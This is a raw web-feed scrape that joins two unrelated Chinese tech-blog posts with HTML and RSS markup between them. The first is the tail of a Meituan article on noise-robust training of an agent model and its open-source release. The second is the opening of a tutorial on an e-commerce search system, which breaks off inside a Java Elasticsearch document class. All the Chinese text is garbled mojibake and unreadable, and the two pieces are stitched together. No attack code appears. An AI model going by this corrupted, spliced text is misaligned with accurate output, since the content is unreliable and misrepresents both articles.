<p>ç°å®ä¸–ç•Œçš„æ™ºèƒ½ä½“ç¯å¢ƒå……æ»¡ä¸ç¡®å®šæ€§ï¼ŒAPI è°ƒç”¨å¤±è´¥ã€è¿”å›å¼‚å¸¸ä¿¡æ¯ã€è§‚æµ‹æ•°æ®ä¸å®Œæ•´ç­‰â€œå™ªå£°â€é—®é¢˜ï¼Œææ˜“å¯¼è‡´æ¨¡å‹å†³ç­–å¤±è¯¯ã€‚ä¸ºæ­¤ï¼Œ<strong>æˆ‘ä»¬åœ¨è®­ç»ƒæ•°æ®çš„è¿‡ç¨‹ä¸­ä¸»åŠ¨æ³¨å…¥å¤šç±»å™ªå£°</strong>ï¼Œæ¨¡æ‹Ÿ API çš„è°ƒç”¨å¤±è´¥ã€è¿”å›é”™è¯¯ä¿¡æ¯ã€æ•°æ®ç¼ºå¤±ç­‰åœºæ™¯ï¼Œå¹¶ç”¨è¯¾ç¨‹å­¦ä¹ ï¼ˆCurriculum Learningï¼‰çš„æ–¹å¼å¾ªåºæ¸è¿›å»åšæ¨¡å‹çš„è®­ç»ƒï¼Œåœ¨è®­ç»ƒè¿‡ç¨‹ä¸­é€æ­¥å¢åŠ å™ªå£°çš„ç±»å‹ä¸å¼ºåº¦â€”â€”å¦‚æœç±»æ¯”æˆæ•™å°å­©éª‘è½¦ï¼Œæˆ‘ä»¬é¦–å…ˆåœ¨å¹³å¦è·¯é¢åšç»ƒä¹ ï¼Œç­‰æŠ€èƒ½æˆç†Ÿåå†é€æ­¥å¢åŠ è·¯é¢çš„å¤æ‚åº¦ã€‚</p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œå¸¦å™ªå£°ç¯å¢ƒä¸‹æœªç»è¿‡ç¨³å¥è®­ç»ƒçš„æ¨¡å‹çš„è¡¨ç°ä¼šå‡ºç°å¤§å¹…è¡°å‡ï¼ŒClaude ä¹Ÿæ— æ³•é€‚åº”å…¨éƒ¨çš„å™ªå£°ç±»å‹ã€‚è€Œç»è¿‡è¿™å¥—ç³»ç»ŸåŒ–çš„æŠ—å¹²æ‰°è®­ç»ƒï¼ŒLongCat-Flash-Thinking-2601ï¼ˆTraining w/ Noise ç»„ï¼‰æ‹¥æœ‰äº†æå¼ºçš„ç¯å¢ƒé€‚åº”èƒ½åŠ›ï¼Œå“ªæ€•åœ¨å¤æ‚ã€ä¸ç†æƒ³çš„åœºæ™¯ä¸­ï¼Œä¹Ÿèƒ½ç¨³å®šå‘æŒ¥ã€é«˜æ•ˆå®Œæˆä»»åŠ¡ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58755c4cbdea4781826364cdbbf874cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478184&amp;x-signature=CfkI9n%2FvqIwmiPNVOMFWt7zVSoE%3D" alt="å¸¦å™ªå£° / æ— å™ªå£°è¯„æµ‹é›†ä¸‹çš„æ¨¡å‹è¡¨ç°å¯¹æ¯”" loading="lazy"/></p>
<h2 data-id="heading-5">å¼€æºä¸éƒ¨ç½²ï¼šä½é—¨æ§›æ¥å…¥ï¼ŒåŠ é€Ÿæ™ºèƒ½ä½“åº”ç”¨è½åœ°</h2>
<p>ä¸ºé™ä½å¼€å‘è€…ä½¿ç”¨é—¨æ§›ï¼Œç¾å›¢ LongCat å›¢é˜ŸåŒæ­¥å¼€æ”¾æ¨¡å‹æƒé‡ã€æ¨ç†ä»£ç ä¸åœ¨çº¿ä½“éªŒèƒ½åŠ›ï¼Œæ”¯æŒä»å¿«é€Ÿè¯•ç”¨è‡³æ·±åº¦å¼€å‘çš„å…¨æµç¨‹éœ€æ±‚ï¼š</p>
<p><strong>å¼€æºå¹³å°</strong></p>
<ul>
<li><strong>GitHub</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmeituan-longcat%2FLongCat-Flash-Thinking-2601" target="_blank" title="https://github.com/meituan-longcat/LongCat-Flash-Thinking-2601" ref="nofollow noopener noreferrer">github.com/meituan-lonâ€¦</a></li>
<li><strong>Hugging Face</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fhuggingface.co%2Fmeituan-longcat%2FLongCat-Flash-Thinking-2601" target="_blank" title="https://huggingface.co/meituan-longcat/LongCat-Flash-Thinking-2601" ref="nofollow noopener noreferrer">huggingface.co/meituan-lonâ€¦</a></li>
<li><strong>ModelScope</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.modelscope.cn%2Fmodels%2Fmeituan-longcat%2FLongCat-Flash-Thinking-2601" target="_blank" title="https://www.modelscope.cn/models/meituan-longcat/LongCat-Flash-Thinking-2601" ref="nofollow noopener noreferrer">www.modelscope.cn/models/meitâ€¦</a></li>
</ul>
<p><strong>åœ¨çº¿ä½“éªŒä¸è°ƒç”¨</strong></p>
<ul>
<li><strong>å®˜ç½‘</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Flongcat.ai" target="_blank" title="https://longcat.ai" ref="nofollow noopener noreferrer">longcat.ai</a></li>
<li><strong>API å¼€æ”¾å¹³å°</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Flongcat.chat%2Fplatform%2Fusage" target="_blank" title="https://longcat.chat/platform/usage" ref="nofollow noopener noreferrer">longcat.chat/platform/usâ€¦</a></li>
</ul>
<p>æ¬¢è¿å¼€å‘è€…ä¸‹è½½ã€éƒ¨ç½²å¹¶ä½“éªŒ LongCat-Flash-Thinking-2601ï¼ŒåŒæ—¶ä¹Ÿæ¬¢è¿æ‚¨åœ¨ LongCat API å¼€æ”¾å¹³å°ç”³è¯·å…è´¹è°ƒç”¨é¢åº¦ã€‚å¦‚æœæ‚¨åœ¨æ™ºèƒ½ä½“å¼€å‘ã€å¤§æ¨¡å‹æ¨ç†ä¼˜åŒ–ç­‰é¢†åŸŸæœ‰åˆä½œæƒ³æ³•æˆ–åé¦ˆï¼Œæˆ‘ä»¬æœŸå¾…ä¸æ‚¨äº¤æµã€‚</p>
<p>| å…³æ³¨ã€Œç¾å›¢æŠ€æœ¯å›¢é˜Ÿã€å¾®ä¿¡å…¬ä¼—å·ï¼Œåœ¨å…¬ä¼—å·èœå•æ å¯¹è¯æ¡†å›å¤ã€2024å¹´è´§ã€‘ã€ã€2023å¹´è´§ã€‘ã€ã€2022å¹´è´§ã€‘ã€ã€2021å¹´è´§ã€‘ã€ã€2020å¹´è´§ã€‘ã€ã€2019å¹´è´§ã€‘ã€ã€2018å¹´è´§ã€‘ã€ã€2017å¹´è´§ã€‘ç­‰å…³é”®è¯ï¼Œå¯æŸ¥çœ‹ç¾å›¢æŠ€æœ¯å›¢é˜Ÿå†å¹´æŠ€æœ¯æ–‡ç« åˆé›†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/06862b52013c4c1bbb99d38d901d3988~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478184&amp;x-signature=jD8rljAd6d2a5ky3z0sRw4nqB4s%3D" alt="" loading="lazy"/></p>
<p>| æœ¬æ–‡ç³»ç¾å›¢æŠ€æœ¯å›¢é˜Ÿå‡ºå“ï¼Œè‘—ä½œæƒå½’å±ç¾å›¢ã€‚æ¬¢è¿å‡ºäºåˆ†äº«å’Œäº¤æµç­‰éå•†ä¸šç›®çš„è½¬è½½æˆ–ä½¿ç”¨æœ¬æ–‡å†…å®¹ï¼Œæ•¬è¯·æ³¨æ˜â€œå†…å®¹è½¬è½½è‡ªç¾å›¢æŠ€æœ¯å›¢é˜Ÿâ€ã€‚æœ¬æ–‡æœªç»è®¸å¯ï¼Œä¸å¾—è¿›è¡Œå•†ä¸šæ€§è½¬è½½æˆ–è€…ä½¿ç”¨ã€‚ä»»ä½•å•†ç”¨è¡Œä¸ºï¼Œè¯·å‘é€é‚®ä»¶è‡³ <a href="https://link.juejin.cn?target=mailto%3Atech%40meituan.com" target="_blank" title="mailto:tech@meituan.com" ref="nofollow noopener noreferrer">tech@meituan.com</a> ç”³è¯·æˆæƒã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åŸºäºSpringCloud + ElasticSearch + Redis + RabbitMQ æ„å»ºé«˜æ€§èƒ½ç”µå•†æœç´¢å’Œä¸ªæ€§åŒ–æ¨èç³»ç»Ÿ]]></title>    <link>https://juejin.cn/post/7596906923892064266</link>    <guid>https://juejin.cn/post/7596906923892064266</guid>    <pubDate>2026-01-19T11:47:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596906923892064266" data-draft-id="7596845113281003529" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åŸºäºSpringCloud + ElasticSearch + Redis + RabbitMQ æ„å»ºé«˜æ€§èƒ½ç”µå•†æœç´¢å’Œä¸ªæ€§åŒ–æ¨èç³»ç»Ÿ"/> <meta itemprop="keywords" content="åç«¯,RabbitMQ"/> <meta itemprop="datePublished" content="2026-01-19T11:47:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸‰æ°´ä¸æ»´"/> <meta itemprop="url" content="https://juejin.cn/user/283045639753100"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åŸºäºSpringCloud + ElasticSearch + Redis + RabbitMQ æ„å»ºé«˜æ€§èƒ½ç”µå•†æœç´¢å’Œä¸ªæ€§åŒ–æ¨èç³»ç»Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/283045639753100/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸‰æ°´ä¸æ»´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T11:47:46.000Z" title="Mon Jan 19 2026 11:47:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»17åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">åŸºäºSpringCloud + Elasticsearch + Redis + RabbitMQ æ„å»ºé«˜æ€§èƒ½ç”µå•†æœç´¢ä¸ä¸ªæ€§åŒ–æ¨èç³»ç»Ÿ</h2>
<p>åœ¨ç”µå•†å¹³å°çš„æ ¸å¿ƒé“¾è·¯ä¸­ï¼Œæœç´¢ä¸æ¨èç›´æ¥å†³å®šäº†ç”¨æˆ·ä½“éªŒä¸è½¬åŒ–æ•ˆç‡ã€‚ä¼ ç»Ÿæ•°æ®åº“æœç´¢é¢ä¸´ç²¾å‡†åº¦ä½ã€å“åº”ç¼“æ…¢ã€æ¨èåŒè´¨åŒ–ç­‰é—®é¢˜ï¼Œè€Œæ¶ˆæ¯é˜Ÿåˆ—çš„å¼•å…¥èƒ½æœ‰æ•ˆè§£å†³æ•°æ®å®æ—¶åŒæ­¥ã€ç³»ç»Ÿè§£è€¦ç­‰å…³é”®è¯‰æ±‚ã€‚æœ¬æ–‡å°†åŸºäº <strong>SpringCloud + ElasticSearch + Redis + RabbitMQ</strong> æŠ€æœ¯æ ˆï¼Œä»æ¶æ„è®¾è®¡ã€æ ¸å¿ƒå®ç°åˆ°æ€§èƒ½ä¼˜åŒ–ï¼Œå®Œæ•´æ‹†è§£ä¸€å¥—å¯è½åœ°çš„ç”µå•†å®æ—¶æœç´¢ä¸ä¸ªæ€§åŒ–æ¨èæ–¹æ¡ˆï¼Œé‡ç‚¹çªå‡º RabbitMQ åœ¨æ•°æ®åŒæ­¥ã€äº‹ä»¶åˆ†å‘ä¸­çš„æ ¸å¿ƒä½œç”¨ã€‚</p>
<h3 data-id="heading-1">ä¸€ã€ç³»ç»Ÿç—›ç‚¹ä¸æ ¸å¿ƒç›®æ ‡</h3>
<h4 data-id="heading-2">1. ä¼ ç»Ÿæ–¹æ¡ˆçš„æ ¸å¿ƒç—›ç‚¹</h4>
<ul>
<li>æœç´¢ç²¾å‡†åº¦ä¸è¶³ï¼šç”¨æˆ·æœç´¢ â€œåä¸ºæ‰‹æœºâ€ å´è¿”å›æ— å…³å•†å“ï¼Œå¤šå­—æ®µåŒ¹é…èƒ½åŠ›è–„å¼±ï¼›</li>
<li>å“åº”é€Ÿåº¦ç¼“æ…¢ï¼šæ•°æ®åº“å…¨è¡¨æ‰«æå¯¼è‡´æœç´¢è€—æ—¶è¶… 3 ç§’ï¼Œç”¨æˆ·ç›´æ¥æµå¤±ï¼›</li>
<li>æ¨èç¼ºä¹ä¸ªæ€§åŒ–ï¼šåƒç¯‡ä¸€å¾‹çš„å•†å“åˆ—è¡¨ï¼Œæ— æ³•è´´åˆç”¨æˆ·å…´è¶£åå¥½ï¼›</li>
<li>æ•°æ®åŒæ­¥æ»åï¼šå•†å“ä¸Šä¸‹æ¶ã€ä»·æ ¼å˜æ›´æ— æ³•å®æ—¶åæ˜ åˆ°æœç´¢ç»“æœï¼›</li>
<li>ç³»ç»Ÿè€¦åˆä¸¥é‡ï¼šå•†å“æœåŠ¡ä¸æœç´¢æœåŠ¡ç›´æ¥ä¾èµ–ï¼Œæ‰©å±•æ€§å·®ï¼Œæ•…éšœä¼ å¯¼é£é™©é«˜ã€‚</li>
</ul>
<h4 data-id="heading-3">2. ç³»ç»Ÿæ ¸å¿ƒç›®æ ‡</h4>
<ul>
<li>é«˜æ€§èƒ½ï¼šæœç´¢å“åº”æ—¶é—´æ§åˆ¶åœ¨æ¯«ç§’çº§ï¼Œæ”¯æŒæ¯ç§’åƒçº§å¹¶å‘ï¼›</li>
<li>é«˜ç²¾å‡†ï¼šæ”¯æŒå…¨æ–‡æœç´¢ã€æ¨¡ç³ŠåŒ¹é…ã€åˆ†ç±»è¿‡æ»¤ã€æœç´¢å»ºè®®ï¼Œç²¾å‡†è¯†åˆ«ç”¨æˆ·æ„å›¾ï¼›</li>
<li>ä¸ªæ€§åŒ–ï¼šåŸºäºç”¨æˆ·è¡Œä¸ºæ•°æ®ï¼Œå®ç° â€œåƒäººåƒé¢â€ çš„æ¨èæ•ˆæœï¼›</li>
<li>å®æ—¶æ€§ï¼šå•†å“æ•°æ®å˜æ›´å®æ—¶åŒæ­¥è‡³æœç´¢å¼•æ“ï¼Œæ•°æ®å»¶è¿Ÿä½äº 1 ç§’ï¼›</li>
<li>é«˜å¯ç”¨ï¼šåˆ†å¸ƒå¼æ¶æ„è®¾è®¡ï¼ŒæœåŠ¡è§£è€¦ï¼Œæ”¯æŒæ¨ªå‘æ‰©å±•ï¼Œæ•…éšœéš”ç¦»ã€‚</li>
</ul>
<h3 data-id="heading-4">äºŒã€æŠ€æœ¯é€‰å‹ä¸æ¶æ„è®¾è®¡</h3>
<h4 data-id="heading-5">1. æ ¸å¿ƒæŠ€æœ¯æ ˆé€‰å‹</h4>













































<table><thead><tr><th>æŠ€æœ¯ç»„ä»¶</th><th>ç‰ˆæœ¬é€‰æ‹©</th><th>æ ¸å¿ƒä½œç”¨</th></tr></thead><tbody><tr><td>SpringCloud</td><td>2023.0.0</td><td>å¾®æœåŠ¡æ¶æ„åº•åº§ï¼Œæä¾›æœåŠ¡æ³¨å†Œå‘ç°ã€è´Ÿè½½å‡è¡¡ã€ç½‘å…³è·¯ç”±ç­‰èƒ½åŠ›</td></tr><tr><td>Elasticsearch</td><td>7.x</td><td>å…¨æ–‡æœç´¢ä¸åˆ†æå¼•æ“ï¼Œæ”¯æ’‘å¤šå­—æ®µæ£€ç´¢ã€æ¨¡ç³ŠåŒ¹é…ã€æœç´¢å»ºè®®ç­‰æ ¸å¿ƒåŠŸèƒ½</td></tr><tr><td>Redis</td><td>6.x</td><td>é«˜é€Ÿç¼“å­˜ç»„ä»¶ï¼Œç¼“å­˜çƒ­ç‚¹å•†å“ã€ç”¨æˆ·è¡Œä¸ºã€æ¨èç»“æœï¼Œé™ä½åº•å±‚å­˜å‚¨è®¿é—®å‹åŠ›</td></tr><tr><td>RabbitMQ</td><td>3.12.x</td><td>æ¶ˆæ¯é˜Ÿåˆ—ï¼Œå®ç°å•†å“æ•°æ®å®æ—¶åŒæ­¥ã€ç”¨æˆ·è¡Œä¸ºé‡‡é›†ã€ç³»ç»Ÿè§£è€¦ä¸æ•…éšœéš”ç¦»</td></tr><tr><td>MySQL</td><td>8.x</td><td>ä¸»æ•°æ®å­˜å‚¨ï¼ŒæŒä¹…åŒ–å•†å“åŸºç¡€ä¿¡æ¯ã€ç”¨æˆ·è¡Œä¸ºæ˜ç»†ã€è®¢å•æ•°æ®ç­‰æ ¸å¿ƒä¸šåŠ¡æ•°æ®</td></tr><tr><td>SpringBoot</td><td>3.2.x</td><td>å¾®æœåŠ¡å¼€å‘æ¡†æ¶ï¼Œç®€åŒ–é…ç½®ä¸å¼€å‘æµç¨‹</td></tr><tr><td>IK Analyzer</td><td>7.17.0</td><td>ä¸­æ–‡åˆ†è¯å™¨ï¼Œæå‡ä¸­æ–‡æœç´¢çš„ç²¾å‡†åº¦</td></tr></tbody></table>
<h4 data-id="heading-6">2. æ•´ä½“æ¶æ„è®¾è®¡</h4>
<p>ç³»ç»Ÿé‡‡ç”¨ â€œäº‹ä»¶é©±åŠ¨ + å¾®æœåŠ¡â€ æ¶æ„ï¼ŒåŸºäº RabbitMQ å®ç°æ ¸å¿ƒé“¾è·¯è§£è€¦ï¼Œæ•´ä½“åˆ†ä¸ºäº”å¤§æ ¸å¿ƒæ¨¡å—ï¼Œå½¢æˆ â€œæ•°æ®é‡‡é›† - å®æ—¶åŒæ­¥ - ç²¾å‡†æ£€ç´¢ - ä¸ªæ€§åŒ–æ¨è - ç¼“å­˜åŠ é€Ÿâ€ çš„å®Œæ•´é—­ç¯ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74233a0ffbc54440b22e7fee22cf4b74~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ5rC05LiN5ru0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769428065&amp;x-signature=qOEUYAKxVjPDyyXFzS87Dpov7Tw%3D" alt="image.png" loading="lazy"/></p>
<h5 data-id="heading-7">æ ¸å¿ƒé“¾è·¯è¯´æ˜</h5>
<ol>
<li><strong>æ•°æ®é‡‡é›†é“¾è·¯</strong>ï¼šç”¨æˆ·è¡Œä¸ºï¼ˆæµè§ˆã€è´­ä¹°ã€æ”¶è—ï¼‰é€šè¿‡ RabbitMQ å¼‚æ­¥é‡‡é›†ï¼Œå­˜å‚¨è‡³ Redisï¼ˆç¼“å­˜ï¼‰ä¸ MySQLï¼ˆæŒä¹…åŒ–ï¼‰ï¼›</li>
<li><strong>æ•°æ®åŒæ­¥é“¾è·¯</strong>ï¼šå•†å“æœåŠ¡è§¦å‘å˜æ›´äº‹ä»¶ï¼Œé€šè¿‡ RabbitMQ è·¯ç”±è‡³å•†å“åŒæ­¥é˜Ÿåˆ—ï¼Œç”±æ¶ˆè´¹ç«¯åŒæ­¥è‡³ Elasticsearchï¼Œå¤±è´¥æ¶ˆæ¯è¿›å…¥æ­»ä¿¡é˜Ÿåˆ—é‡è¯•ï¼›</li>
<li><strong>æœç´¢æ£€ç´¢é“¾è·¯</strong>ï¼šç”¨æˆ·æœç´¢è¯·æ±‚ç» API ç½‘å…³è·¯ç”±è‡³æœç´¢æœåŠ¡ï¼Œé€šè¿‡ Elasticsearch å®ç°ç²¾å‡†æ£€ç´¢ä¸æœç´¢å»ºè®®ï¼›</li>
<li><strong>ä¸ªæ€§åŒ–æ¨èé“¾è·¯</strong>ï¼šæ¨èæœåŠ¡è¯»å– Redis ä¸­çš„ç”¨æˆ·è¡Œä¸ºæ•°æ®ï¼Œç»“åˆååŒè¿‡æ»¤ä¸å†…å®¹æ¨èç®—æ³•ï¼Œç”Ÿæˆä¸ªæ€§åŒ–æ¨èåˆ—è¡¨ï¼›</li>
<li><strong>ç¼“å­˜åŠ é€Ÿé“¾è·¯</strong>ï¼šRedis ç¼“å­˜çƒ­ç‚¹å•†å“ã€æœç´¢ç»“æœã€æ¨èåˆ—è¡¨ï¼Œç¼©çŸ­å“åº”æ—¶é—´ï¼Œæå‡ç³»ç»Ÿååé‡ã€‚</li>
</ol>
<h3 data-id="heading-8">ä¸‰ã€æ ¸å¿ƒåŠŸèƒ½å®ç°</h3>
<h4 data-id="heading-9">1. æ•°æ®æ¨¡å‹è®¾è®¡</h4>
<h5 data-id="heading-10">1.1 Elasticsearch å•†å“æ–‡æ¡£æ¨¡å‹</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Document(indexName = "products")</span>
<span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductDocument</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-keyword">private</span> String id;

    <span class="hljs-comment">// å•†å“åç§°ï¼Œåˆ†è¯+æƒé‡æå‡ï¼Œæœç´¢ä¼˜å…ˆçº§æœ€é«˜</span>
    <span class="hljs-meta">@Field(type = FieldType.Text, analyzer = "ik_max_word", searchAnalyzer = "ik_smart")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-comment">// å•†å“æè¿°ï¼Œåˆ†è¯ç´¢å¼•</span>
    <span class="hljs-meta">@Field(type = FieldType.Text, analyzer = "ik_max_word")</span>
    <span class="hljs-keyword">private</span> String description;

    <span class="hljs-comment">// åˆ†ç±»ï¼Œkeywordç±»å‹ä¸åˆ†è¯ï¼Œç”¨äºç²¾ç¡®è¿‡æ»¤</span>
    <span class="hljs-meta">@Field(type = FieldType.Keyword)</span>
    <span class="hljs-keyword">private</span> String category;

    <span class="hljs-comment">// å“ç‰Œï¼Œkeywordç±»å‹ä¸åˆ†è¯</span>
    <span class="hljs-meta">@Field(type = FieldType.Keyword)</span>
    <span class="hljs-keyword">private</span> String brand;

    <span class="hljs-comment">// ä»·æ ¼ï¼Œæ•°å€¼ç±»å‹ç”¨äºèŒƒå›´æŸ¥è¯¢ä¸æ’åº</span>
    <span class="hljs-meta">@Field(type = FieldType.Double)</span>
    <span class="hljs-keyword">private</span> BigDecimal price;

    <span class="hljs-comment">// å•†å“å›¾ç‰‡URL</span>
    <span class="hljs-meta">@Field(type = FieldType.Keyword)</span>
    <span class="hljs-keyword">private</span> String imageUrl;

    <span class="hljs-comment">// é”€é‡ï¼Œç”¨äºçƒ­é—¨æ’åº</span>
    <span class="hljs-meta">@Field(type = FieldType.Long)</span>
    <span class="hljs-keyword">private</span> Long salesVolume;

    <span class="hljs-comment">// è¯„åˆ†ï¼Œç”¨äºä¼˜è´¨å•†å“æ’åº</span>
    <span class="hljs-meta">@Field(type = FieldType.Float)</span>
    <span class="hljs-keyword">private</span> Float rating;

    <span class="hljs-comment">// æ ‡ç­¾ï¼Œå¤šå€¼keyword</span>
    <span class="hljs-meta">@Field(type = FieldType.Keyword)</span>
    <span class="hljs-keyword">private</span> List&lt;String&gt; tags;

    <span class="hljs-comment">// åˆ›å»ºæ—¶é—´</span>
    <span class="hljs-meta">@Field(type = FieldType.Date)</span>
    <span class="hljs-keyword">private</span> Date createTime;

    <span class="hljs-comment">// æ›´æ–°æ—¶é—´</span>
    <span class="hljs-meta">@Field(type = FieldType.Date)</span>
    <span class="hljs-keyword">private</span> Date updateTime;

    <span class="hljs-comment">// æœç´¢å»ºè®®å­—æ®µï¼Œç”¨äºè‡ªåŠ¨è¡¥å…¨</span>
    <span class="hljs-meta">@CompletionField</span>
